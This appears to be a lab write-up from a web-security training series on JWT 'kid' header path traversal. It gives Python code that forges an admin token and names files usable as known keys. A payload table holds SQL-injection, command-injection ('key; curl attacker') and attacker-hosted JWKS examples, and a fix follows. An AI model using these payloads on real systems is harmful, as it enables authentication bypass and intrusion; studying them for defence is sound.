# Lab 11 — Keyring

## The finding is in the header

```json
{"alg":"HS256","typ":"JWT","kid":"main.key"}
```

`kid` — key id — tells the verifier *which* key to check the signature with.
It is a lookup key supplied by the person whose signature is being checked. Any
time a value from the token reaches a lookup, ask what the lookup is made of.

Here it is made of the filesystem:

```python
return (ROOT / "keys" / kid).read_bytes()
```

No normalisation, no containment check. `kid` is a path.

## Turning a path into a forged token

You do not need to *read* a key. You need the verifier to use a key whose bytes
you already know. Any readable file will do, and the ideal one is a file the
application serves you:

```
kid = "../static/brand.txt"     → key = the bytes of GET /static/brand.txt
```

Get those bytes **exactly**. A file fetched into a terminal loses its trailing
newline, gains a shell's idea of encoding, and produces an HMAC that is right in
every way except numerically. Pull it out of the message store instead:

```bash
h5i browser open http://127.0.0.1:9110/static/brand.txt --session lab11 --new --capture
h5i websec show res_0 --session lab11 --body-to /tmp/brand.txt
```

`--body-to` writes the body to a file exactly as it came back. It is the right
tool whenever the *bytes* matter: PEM keys, images for magic-number checks,
binaries you will re-upload.

Then sign:

```python
signed = part({"alg":"HS256","typ":"JWT","kid":"../static/brand.txt"}) + "." + \
         part({"sub":"guest","role":"admin"})
token  = signed + "." + b64(hmac.new(open("/tmp/brand.txt","rb").read(),
                                     signed.encode(), hashlib.sha256).digest())
```

## Other files that make good keys

In rough order of reliability:

1. **A static asset the app serves.** Best: you can read it and confirm it.
2. **`/dev/null`** → an empty key. `kid: "../../../../dev/null"`. Works
   whenever the code does not reject a zero-length key, which is often.
3. **A predictable system file** — `/proc/sys/kernel/ostype` (`Linux\n`),
   `/etc/hostname` in a container whose name you know.
4. **A file you uploaded**, if the app has any upload at all.

## The same header field, other backends

`kid` is only a filename here. Follow it to whatever it actually indexes:

| Backend | Payload | Result |
| --- | --- | --- |
| filesystem | `../static/brand.txt` | this lab |
| SQL | `x' UNION SELECT 'known-key' -- ` | key becomes a literal you chose |
| shell / `openssl` call | `key; curl attacker` | command injection |
| HTTP key service | `http://attacker/jwks` | you serve the key |

And the neighbouring headers do it without traversal at all: **`jku`** and
**`x5u`** name a *URL* the verifier fetches keys from. If either is honoured
unrestricted, host your own JWKS and forge anything — that is both an SSRF and
a total authentication bypass in one field.

## The fix

`kid` selects from a fixed, server-side map — never a path, a query, or a URL:

```python
KEYS = {"main-2026": b"...", "main-2025": b"..."}
key = KEYS.get(head.get("kid"))
if key is None: reject()
```

Reject unknown ids rather than falling back to a default. Ignore `jku`/`x5u`
entirely unless you have a pinned allowlist of URLs, and never fetch from a URL
in a token.

## h5i technique

`websec show --body-to PATH` for exact bytes. Remember it for Lab 18 (XXE) and
Lab 28 (upload), where "close enough" bytes fail silently.
